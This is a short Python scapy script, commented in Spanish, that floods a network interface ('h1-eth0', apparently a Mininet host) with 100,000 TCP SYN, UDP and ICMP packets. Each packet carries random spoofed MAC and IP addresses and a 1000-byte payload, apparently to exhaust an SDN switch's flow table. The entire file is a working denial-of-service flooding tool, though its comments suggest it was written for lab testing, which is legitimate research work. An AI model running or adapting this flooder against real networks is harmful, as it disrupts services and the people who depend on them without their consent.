from scapy.all import sendp, Ether, IP, UDP, TCP, ICMP, Raw
import random
import time

def random_mac():
    return "00:00:00:00:00:%02x" % random.randint(1, 255)

def random_ip():
    return "10.0.%d.%d" % (random.randint(1, 254), random.randint(1, 254))

def flood_flow_table(iface):
    for i in range(100000):  # Enviar 100000 paquetes para probar
        # Generar direcciones y puertos aleatorios
        src_mac = random_mac()
        dst_mac = random_mac()
        src_ip = random_ip()
        dst_ip = random_ip()
        
        # Seleccionar aleatoriamente el tipo de paquete (TCP, UDP, ICMP)
        pkt_type = random.choice(['TCP', 'UDP', 'ICMP'])
        
        if pkt_type == 'UDP':
            pkt = Ether(src=src_mac, dst=dst_mac) / \
                  IP(src=src_ip, dst=dst_ip) / \
                  UDP(sport=random.randint(1024, 65535), dport=random.randint(1, 1024)) / \
                  Raw(load="X" * 1000)  # Añadir 1000 bytes de datos
        elif pkt_type == 'TCP':
            pkt = Ether(src=src_mac, dst=dst_mac) / \
                  IP(src=src_ip, dst=dst_ip) / \
                  TCP(sport=random.randint(1024, 65535), dport=random.randint(1, 1024), flags="S") / \
                  Raw(load="X" * 1000)  # Añadir 1000 bytes de datos
        else:  # ICMP
            pkt = Ether(src=src_mac, dst=dst_mac) / \
                  IP(src=src_ip, dst=dst_ip) / \
                  ICMP() / \
                  Raw(load="X" * 1000)  # Añadir 1000 bytes de datos
        
        print(f"Enviando paquete {pkt_type}: {pkt.summary()}")
        sendp(pkt, iface=iface, verbose=False)
        # time.sleep(0.1)  # Descomentar para ralentizar el envío si es necesario

if __name__ == "__main__":
    flood_flow_table("h1-eth0")  # Cambia "h1-eth0" si es necesario
